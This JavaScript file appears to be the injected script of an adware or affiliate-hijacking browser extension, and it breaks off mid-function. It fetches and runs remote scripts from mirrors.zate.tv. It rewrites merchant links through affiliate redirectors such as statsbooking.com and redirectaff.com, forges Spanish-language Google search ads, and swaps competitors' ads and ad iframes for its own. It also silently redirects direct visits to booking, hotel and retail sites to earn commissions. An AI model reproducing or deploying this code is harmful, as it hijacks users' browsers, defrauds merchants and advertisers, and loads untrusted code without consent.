if (location.href.match(/^http:\/\/(www\.)?zate\.(com|tv|net)/i) || location.href.match(/^http:\/\/(www\.)?movielizate\.(com|tv|net)/i) || location.href.match(/^http:\/\/(www\.)?serializate\.(com|tv|net)/i) || location.href.match(/^http:\/\/(www\.)?tvlizate\.(com|tv|net)/i)) {
    if (document.getElementById("zate_plugin")) {
        if (document.getElementById("zate_plugin").src.match(/get_plugin/i)) {
            var al = document.getElementById("zate_dir").innerHTML.replace(/amp;/gi, '');
            document.getElementById("zate_plugin").src = "http://player.zate.tv/fuente/" + al
        }
    }
}
var loca = (location.href.match(/zatetv=/i));
if (location.href.match(/^http:\/\/(www\.)?bayfiles\.net/i) && loca) {
    addScript("bayfiles");
}else if (location.href.match(/^http:\/\/(www\.)?billionuploads\.com/i) && loca) {
    addScript("billion");
}else if (location.href.match(/^http:\/\/(www\.)?hugefiles\.net/i) && loca) {
    addScript("huge");
}else if (location.href.match(/^http:\/\/(www\.)?vshare\.eu/i) && loca) {
    addScript("videoshare");
}else if (location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loca) {
    addScript("180upload");
}else if (location.href.match(/^http:\/\/(www\.)?uptobox\.com/i) && loca) {
    addScript("uptobox");
}else if (location.href.match(/^http:\/\/(www\.)?megashares\.com/i) && loca) {
    addScript("megashares");
}else if (location.href.match(/^http:\/\/(www\.)?uplea\.com/i) && loca) {
    addScript("uplea");
}else if (location.href.match(/^http:\/\/(www\.)?crocko\.com/i) && loca) {
    addScript("crocko");
}else if (location.href.match(/^http:\/\/(www\.)?nowvideo\.sx/i) && loca) {
    addScript("nowvideo");
}else if (location.href.match(/^http:\/\/(www\.)?sharesix\.com/i) && loca) {
    addScript("sharesix");
}else if (location.href.match(/^http:\/\/(www\.)?vidzi\.tv/i) && loca) {
    addScript("vidzi");
}else if (location.href.match(/^http:\/\/(www\.)?powvideo\.net/i) && loca) {
    addScript("powvideo");
}

function addScript(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "http://mirrors.zate.tv/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}

  

function getSizes(a) {
    var myWidth = 0, myHeight = 0;
    if (typeof (window.innerWidth) === 'number') {
        myWidth = window.innerWidth;
        myHeight = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        myWidth = document.documentElement.clientWidth;
        myHeight = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        myWidth = document.body.clientWidth;
        myHeight = document.body.clientHeight;
    }
    if(a == 'w')
    return myWidth
    else if (a == 'h')
    return myHeight;
    else
    return myWidth + 'x' + myHeight;
}
function createCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}
function getCookie(c_name) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length;
            }
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return "empty";
}
 function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600', '120x600', '336x280'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];
    
    var ret = false;
    
    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }
    return ret;

}
function isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}
var domains = ['booking.com'];
function checkValidDesc(a) {
    for (var i = 0; i < domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return true;
        }
    }
    return false;
}

function t_z(){
var domaz = ['tripadvisor.cl','tripadvisor.com.ar','tripadvisor.com.co','tripadvisor.com.mx','tripadvisor.com.pe','tripadvisor.com.ve','tripadvisor.com'];
    
   for (tfz = 0; tfz < domaz.length; tfz++) {
        var t_urls = window.location.href;
        var z_url = t_urls.split("/");
        var zzurl = z_url[3];
        z_url = z_url[2];
        if(!document.referrer && (z_url.indexOf(domaz[tfz]) === 0 || z_url.indexOf('www.'+ domaz[tfz]) === 0) && getCookie('trz').indexOf('empty') !== -1 && !zzurl){
            createCookie('trz', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href = 'http://redirectaff.com/home.html?to=http://ad.zanox.com/ppc/?29423371C1086517019&ulp=[['+window.location.href+']]';
        }
    }
}


function e_z() {
if (window.location.protocol !== "https:") {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
        if (!isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue
        }
        if (checkValidDesc(a[i].href)) {
            a[i].href = "http://statsbooking.com/ref.html?track=" + a[i].href + "?aid=descuentodos"
        }
    }
}
var t = setInterval(function() {
    var ad = document.getElementsByClassName("ads-ad");
    if (window.location.href.indexOf("booking") > -1 || window.location.href.indexOf("hotel") > -1 || window.location.href.indexOf("hostel") > -1 || window.location.href.indexOf("hostal") > -1 || window.location.href.indexOf("albergue") > -1 || window.location.href.indexOf("posada") > -1 || window.location.href.indexOf("motel") > -1 || window.location.href.indexOf("apartamento") > -1 || window.location.href.indexOf("apart") > -1) {
        if (ad.length > 0) {
            clearInterval(t);
            var d = "";
            d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="http://statsbooking.com/google.html?track=http://www.booking.com/index.html?aid=333206" id="s0p1"></a>';
            d += '<a href="http://statsbooking.com/google.html?track=http://www.booking.com/index.html?aid=333206" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et"><b>Booking</b>.com: Hoteles - <b>Booking</b>.com: reserva fácil y rápido‎</a></h3>';
            d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>booking</b>.com</cite>‎</div>';
            d += '<div class="ads-creative">531.000+ Hoteles en todo el mundo.</div>';
            d += '<div class="_Rdb _Nf">Albergues&nbsp;·&nbsp;Apartamentos&nbsp;·&nbsp;Casas de Vacaciones&nbsp;·&nbsp;Hostels</div>';
            d += '<ul class="_Pr"><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/ar/buenos-aires.html?aid=333206">750 Buenos Aires Hoteles</a></h3><div class="ads-creative ac">¡Precio Mínimo Garantizado!<br>Reservar un Hotel en Buenos Aires</div></li><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/mx/mexico.html?aid=333206">Hoteles Ciudad de México</a></h3><div class="ads-creative ac">Reserva online y paga en el hotel<br>Reservar Ciudad de México Hoteles</div></li><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/us/new-york.html?aid=333206">500 Hoteles en Nueva York</a></h3><div class="ads-creative ac">Hoteles al 50%<br>Reserva un Hotel en Nueva York</div></li><li><h3><a href="http://statsbooking.com/google.html?track=http://www.booking.com/city/es/ibiza.html?aid=333206">100 Hoteles en Ibiza</a></h3><div class="ads-creative ac">Pago siempre 100% seguro.<br>Reserva un Hotel en Ibiza</div></li></ul>';
            d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
            ad['0'].innerHTML = d
        }
    }else if(window.location.href.indexOf("groupon") > -1 || window.location.href.indexOf("grupon") > -1){
        }else if (window.location.href.indexOf("despegar") > -1 || window.location.href.indexOf("vuelos") > -1 || window.location.href.indexOf("paquetes") > -1){
             if (ad.length > 0) {
                        
                clearInterval(t);
                var d = "";
                d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="http://statsdespegar.com/google.html?to=http://despegar.com/reddeafiliados/tracking/banner?country=US&affiliate=AG50026&params=vuelos&seller=1276" id="s0p1"></a>';
                d += '<a href="http://statsdespegar.com/google.html?to=http://despegar.com/reddeafiliados/tracking/banner?country=US&affiliate=AG50026&params=vuelos&seller=1276" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et"><b>Despegar.com</b> - Vuelos, hoteles, paquetes y más! </a></h3>';
                d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>despegar</b>.com/</cite>‎</div>';
                d += '<div class="ads-creative">Ofertas en Pasajes Aéreos Viajes, Hoteles y Autos. Reserve!</div>';
                d += '<div class="_Rdb _Nf">La Agencia de Viajes más Grande de Latinoamérica</div>';
                d += '<ul class="_Pr"><li><h3><a href="http://statsdespegar.com/google.html?to=http://despegar.com/reddeafiliados/tracking/link?params=hoteles%2Fhl%2FBUE%2Fi1%2F&country=US&affiliate=AG50026">Buenos Aires Hoteles</a></h3><div class="ads-creative ac">Super Ofertas!<br>Reservar un Hotel en Buenos Aires</div></li><li><h3><a href="http://statsdespegar.com/google.html?to=http://despegar.com/reddeafiliados/tracking/link?params=vuelos&country=US&affiliate=AG50026">Vuelos a todo el Mundo</a></h3><div class="ads-creative ac">Promociones Exclusivas a USA <br>Reservá Online en Despegar.com™!</div></li><li><h3><a href="http://statsdespegar.com/google.html?to=http://despegar.com/reddeafiliados/tracking/link?params=hoteles%2Fhl%2FMIA%2Fi1%2F&country=US&affiliate=AG50026"> Hoteles en Miami</a></h3><div class="ads-creative ac">Hoteles al 50%<br>Reserva un Hotel en Miami</div></li><li><h3><a href="http://statsdespegar.com/google.html?to=http://despegar.com/reddeafiliados/tracking/link?params=hoteles%2Fhl%2FNYC%2Fi1%2F&country=US&affiliate=AG50026"> Hoteles en Nueva York</a></h3><div class="ads-creative ac">Pago siempre 100% seguro.<br>Reserva un Hotel en Nueva York</div></li></ul>';
                d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
                ad['0'].innerHTML = d  
            
            }
        }
}, 100);
}


function h_z(){
 var linkz = {'godaddy.com': 'http://redirectaff.com/home.html?to=http://www.tkqlhce.com/click-7403952-10497118?url=https://www.godaddy.com/es/', 
                        'despegar.com.ar': 'http://despegar.com/reddeafiliados/tracking/banner?country=AR&affiliate=AG50026&params=vuelos&seller=1276',
                        'despegar.com.co': 'http://despegar.com/reddeafiliados/tracking/banner?country=CO&params=vuelos&affiliate=AG50026&seller=1279',
                        'despegar.com.mx': 'http://despegar.com/reddeafiliados/tracking/banner?country=MX&affiliate=AG50026&params=vuelos&seller=1317',
                        'despegar.com': 'http://despegar.com/reddeafiliados/tracking/banner?country=US&affiliate=AG50026&params=vuelos&seller=1332',
                        'hilton.com': 'http://redirectaff.com/a311kfBhot.html?to=http://www.tkqlhce.com/click-7663935-11413186?url=http://www.hilton.com/',
                        'hotels.com': 'http://redirectaff.com/hotel.html?to=http://www.dpbolvw.net/click-7775648-10780389-1420587947000?url=http://es.hotels.com',
                        'hoteles.com': 'http://redirectaff.com/hotel.html?to=http://www.dpbolvw.net/click-7775648-10780389-1420587947000?url=http://es.hotels.com',
                        'priceline.com': 'http://redirectaff.com/a311kfBhot.html?to=http://www.kqzyfj.com/click-7663935-10370045',
                        'hostelworld.com': 'http://redirectaff.com/hostel.html?to=http://tc.tradetracker.net/?c=8930&m=329713&a=195517&r=&u=',
                        'alibaba.com': 'http://redirectaff.com/home.html?to=http://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=645cef25&desturl=http%3A%2F%2Fwww.alibaba.com',
                        'dhgate.com': 'http://redirectaff.com/home.html?to=http://www.jdoqocy.com/click-7660361-11910936?url=http://es.dhgate.com/',
                        'dx.com': 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=16274&m=584770&a=195735&r=&u=',
                        'aliexpress.com': 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=15716&m=563114&a=195735&r=&u=',
                        'pandawill.com': 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=14700&m=527031&a=195517&r=&u=',
                        'dafiti.cl': 'http://redirectaff.com/dafiti.html?to=https://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=7a585e51&chan=Banner',
                        'dafiti.com.ar': 'http://redirectaff.com/dafiti.html?to=https://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=6d591677',
                        'dafiti.com.mx': 'http://redirectaff.com/dafiti.html?to=https://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=32020981&chan=Banner',
                        'dafiti.com.co': 'http://redirectaff.com/dafiti.html?to=http://redirectaff.com/dafiti.html?to=https://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=192fe4b6&desturl=http%3A%2F%2Fwww.dafiti.com.co&chan=Banner',
                        'hostelbookers.com': 'http://redirectaff.com/hostel.html?to=https://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=d7e8bb22&chan=Banner',
                        'cl.letsbonus.com': 'http://redirectaff.com/home.html?to=http://clk.tradedoubler.com/click?p=227370&a=2448933&g=21485568',
                        'letbonus.cl': 'http://redirectaff.com/home.html?to=http://clk.tradedoubler.com/click?p=227370&a=2448933&g=21485568',
                        'es.otel.com': 'http://redirectaff.com/a311kfBhot.html?to=http://www.jdoqocy.com/click-7663935-10607654?url=http://es.otel.com/',
                        'focalprice.com': 'http://redirectaff.com/home.html?to=http://www.kqzyfj.com/click-7403952-11305029?url=http://es.focalprice.com/',
                        'trivago.com': 'http://redirectaff.com/home.html?to=http://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=6897bdb0',
                        'linio.com.mx': 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=10763&m=670932&a=195735&r=http://www.linio.com.mx/'
                        };
var doma = ['godaddy.com','despegar.com.ar','despegar.com.co','despegar.com.mx','despegar.com','hotels.com','hoteles.com','hostelworld.com','alibaba.com','dhgate.com','dx.com','aliexpress.com','pandawill.com','dafiti.cl','dafiti.com.ar','dafiti.com.co','dafiti.com.mx','hostelbookers.com','cl.letsbonus.com','letsbonus.cl','es.otel.com','focalprice.com','trivago.com', 'linio.com.mx'];

var clave = ['booking.com/index.es.html'];
var post = {'booking.com/index.es.html': 'http://statsbooking.com/google1CP.html?to=http://www.kqzyfj.com/click-7763021-11707460?url=http://www.booking.com/index.es.html'};

                var gr="";
        

                    var daf="";
               
        


        var l_oc, urls = {godaddy: 'http://redirectaff.com/a311kfBhos.html?to=http://www.tkqlhce.com/click-7679425-10378406?url=https://www.godaddy.com/es/', 
                        aliexpress: 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=15716&m=563114&a=195735&r=&u=', 
                        dx: 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=16274&m=584770&a=195735&r=&u=' ,
                        letsbonus: 'http://redirectaff.com/home.html?to=http://clk.tradedoubler.com/click?p=227370&a=2448933&g=21485568', 
                        groupon: gr, dafiti: daf ,
                        priceline: 'http://redirectaff.com/a311kfBhot.html?to=http://www.kqzyfj.com/click-7663935-10370045',
                        hostelworld: 'http://redirectaff.com/hostel.html?to=http://tc.tradetracker.net/?c=8930&m=329713&a=195517&r=&u=', 
                        alibaba: 'http://redirectaff.com/home.html?to=http://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=d406e0fc',
                        pandawill: 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=14700&m=527031&a=195517&r=&u=', 
                        dhgate: 'http://redirectaff.com/home.html?to=http://www.jdoqocy.com/click-7660361-11910936?url=http://es.dhgate.com/', 
                        hostelbookers: 'http://redirectaff.com/hostel.html?to=https://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=d7e8bb22&chan=Banner',
                        focalprice: 'http://redirectaff.com/home.html?to=http://www.kqzyfj.com/click-7403952-11305029?url=http://es.focalprice.com/',
                        booking: 'http://statsbooking.com/google1CP.html?to=http://www.kqzyfj.com/click-7763021-11707460?url=http://www.booking.com/index.es.html',
                        trivago: 'http://redirectaff.com/home.html?to=http://my.pampanetwork.com/scripts/click.php?a_aid=5428e5ef4f387&a_bid=6897bdb0',
                        linio: 'http://redirectaff.com/home.html?to=http://tc.tradetracker.net/?c=10763&m=670932&a=195735&r=http://www.linio.com.mx/',
                        'www.hotels.com': 'http://redirectaff.com/hotel.html?to=http://www.dpbolvw.net/click-7775648-10780389-1420587947000?url=http://es.hotels.com',
                        'www.hoteles.com': 'http://redirectaff.com/hotel.html?to=http://www.dpbolvw.net/click-7775648-10780389-1420587947000?url=http://es.hotels.com'
                        };
        

        var kfz = ['godaddy', 'letsbonus' , 'booking','dx', 'aliexpress' ,  'godaddy', 'dhgate', 'hostelbookers', 'hostelworld', 'alibaba', 'pandawill', 'focalprice','trivago','www.hotels.com','www.hoteles.com'];
      
   
  var inter = setInterval(function() {
            l_oc = document.getElementsByTagName('span');

            for (i = 0; i < l_oc.length; i++) {
                var elem = l_oc[i];

                if (elem.innerHTML === "Ad" || elem.innerHTML === "Anuncio") {
                    var parent = elem.parentNode.parentNode;
                    var check = elem.nextSibling;

                    clearInterval(inter);

                    for (x = 0; x < parent.childNodes.length; x++) {
                        var child = parent.childNodes[x];

                        if (child.tagName.toLowerCase() === "h3") {

                            var anclas = child.getElementsByTagName('a');
                            
                            for (y = 0; y < kfz.length; y++) {

                                if (anclas[1].innerHTML.toLowerCase().indexOf(kfz[y]) !== -1 || check.innerHTML.toLowerCase().indexOf(kfz[y]) !== -1) {

                                    anclas[1].href = urls[kfz[y]];
                                    anclas[0].href = urls[kfz[y]];
                                }
                            }
                        }
                    }
                }
            }
        });




var ttz = setInterval(function() {
    var all = document.getElementsByTagName('ol');

    if (all.length > 0) {
        clearInterval(ttz);
        for (i = 0; i < all.length; i++) {
            if (all[i].id === "rso") {
                var result = all[i].getElementsByTagName('li');
                for (x = 0; x < result.length; x++) {
                    var h3 = result[x].getElementsByTagName('h3');
                    if (h3.length > 0) {
                        var link = h3[0].getElementsByTagName('a');

                        for (z = 0; z < clave.length; z++) {
                            if (link[0].href.indexOf(clave[z]) !== -1 && link[0].href.indexOf('//stats') === -1) {
                                                                link[0].href = post[clave[z]];
                            }
                        }
                    }
                }
            }
        }
    }
}, 100);

    for (f_z = 0; f_z < doma.length; f_z++) {
        var t_urls = window.location.href;
        var z_url = t_urls.split("/");
        z_url = z_url[2];
        if(t_urls.indexOf('.alibaba.com') !== -1 || t_urls.indexOf('.aliexpress.com') !== -1 || t_urls.indexOf('.hotels.com') !== -1){
        if(!document.referrer && window.location.href.indexOf(doma[f_z]) !== -1 && getCookie('lp').indexOf('empty') !== -1 && window.location.href.indexOf('utm_campaign') === -1){
            createCookie('lp', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href =   linkz[doma[f_z]];
        }
        }else{
        if(!document.referrer && (z_url.indexOf(doma[f_z]) === 0 || z_url.indexOf('www.'+ doma[f_z]) === 0) && getCookie('lp').indexOf('empty') !== -1 && window.location.href.indexOf('utm_medium') === -1 && window.location.href.indexOf('PID') === -1){
            createCookie('lp', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href =   linkz[doma[f_z]];
        }
    }
}
}

function d_z(){
var kfz = ['hertz', 'cartrawler','rentalcars','avis'];
var inter = setInterval(function () {
    var spanes = document.getElementsByTagName('span');

    for (i = 0; i < spanes.length; i++) {
        var elem = spanes[i];
        if (elem.innerHTML === "Ad" || elem.innerHTML === "Anuncio") {
            var parent = elem.parentNode.parentNode;var check = elem.nextSibling;clearInterval(inter);
            for (x = 0; x < parent.childNodes.length; x++) {
                var child = parent.childNodes[x];
                if (child.tagName.toLowerCase() === "h3") {
                    var anclas = child.getElementsByTagName('a');
                                    for (y = 0; y < kfz.length; y++) {
                    if (anclas[1].innerHTML.toLowerCase().indexOf(kfz[y]) !== -1 || check.innerHTML.toLowerCase().indexOf(kfz[y]) !== -1) {
                                                anclas[0].innerHTML = "DeVuelo.com - Alquiler de Autos Reserve En Linea";anclas[1].innerHTML = "DeVuelo.com - Alquiler de Autos Reserve En Linea";
                                                 anclas[1].href = "http://devuelo.com/autos";anclas[0].href = "http://devuelo.com/autos";
                                                var dom = child.nextSibling.childNodes;dom[1].innerHTML = "www.<b>devuelo</b>.com/";var ad = child.nextSibling.nextSibling;
                        ad.innerHTML ='Encuentra coches de alquiler al mejor precio con el buscador de DeVuelo.<br> Comparamos entre decenas de compañías de alquiler de coches. <br>Precio mínimo Garantizado.';
                                                try {
                            var seg = child.parentNode.getElementsByClassName('_Bu')[0];
                            if (seg !== undefined)
                                seg.parentElement.removeChild(seg);
                        } catch (e) {
                        }
                                                try {
                            var tags = child.parentNode.getElementsByClassName('_G8')[0];
                            if (tags !== undefined)
                                tags.parentElement.removeChild(tags);
                        } catch (e) {
                        }
                                                try {
                            var otags = child.parentNode.getElementsByCLassName('_gBb')[0];
                            if (otags !== undefined)
                                otags.parentElement.removeChild(otags);
                        } catch (e) {
                        }
                        try {
                            var otags = child.parentNode.getElementsByCLassName('_H2b')[0];
                            if (otags !== undefined)
                                otags.parentElement.removeChild(otags);
                        } catch (e) {
                        }
                    }
                                       }
                }
            }
        }
    }
});
}

function a_z() {
    var texts = document.getElementsByTagName('text');
    if (texts.length > 0) {
        for (i = 0; i < texts.length; i++) {
            if (texts[i].innerHTML === 'Google' || texts[i].innerHTML.indexOf('Google') !== -1 || texts[i].innerHTML.search("Anuncios") > -1 || texts[i].innerHTML.indexOf("Anuncios") !== -1 || texts[i].innerHTML.indexOf("anuncios") !== -1  || texts[i].innerHTML === 'Gesti&oacute;n anuncios' || texts[i].innerHTML === 'AdChoices') {
                var parent = texts[i];
                while (parent.tagName.toUpperCase() !== 'HTML') {
                    if (parent.tagName.toLowerCase() === 'body') {
                    var w = getSizes('w');
                    var h = getSizes('h');
                     if (tam(getSizes('t'), true)){
                                                                        parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://zomvid.com/p.htm?2=' + w + '&1=' + h + '"></iframe>';
                                                                            }
                    }
                    parent = parent.parentNode;
                }
            }
        }
    }
}


function b_z(){
    var choises = document.getElementsByTagName('img');
    if(choises.length > 0){
        for(i = 0; i < choises.length; i++){
            var child = choises[i];
            if(child.alt === 'AdChoices' || child.src.indexOf("/c_30_us.png") > -1 || child.src.indexOf('//c.betrad.com/') !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                      var w = getSizes('w');
                        var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
                                                                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://zomvid.com/p.htm?2=' + w + '&1=' + h + '"></iframe>';
                                                  
                                                 }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}
function c_z(){
    var ifra = document.getElementsByTagName("iframe");
    if(ifra.length > 0){
        for(i = 0; i < ifra.length; i++){
            var child = ifra[i];
             if(child.src.indexOf("doubleclick.net") !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        var w = getSizes('w');
                            var h = getSizes('h');
                            if (tam(getSizes('t'), true)){
                                                                                     child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://zomvid.com/p.htm?2=' + w + '&1=' + h + '"></iframe>';
                                                  
                                                }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}




a_z();
b_z();
c_z();


function bki(){
    var t_urls = window.location.href;
    var z_url = t_urls.split("/");
    z_url = z_url[2];
    if(!document.referrer && (z_url.indexOf('booking.com') === 0 || z_url.indexOf('www.'+ 'booking.com') === 0) && getCookie('bki').indexOf('empty') !== -1 && window.location.href.indexOf('aid') === -1){

            createCookie('bki', Math.floor((Math.random() * 10000) + 1) ,'1');
            var nextpage=window.location.href;
            if(nextpage==='http://www.booking.com/')
            {
            nextpage='http://www.booking.com/index.es.html';
            }
                        window.location.href =   'http://statsbooking.com/google332H.html?track='+window.location.href;
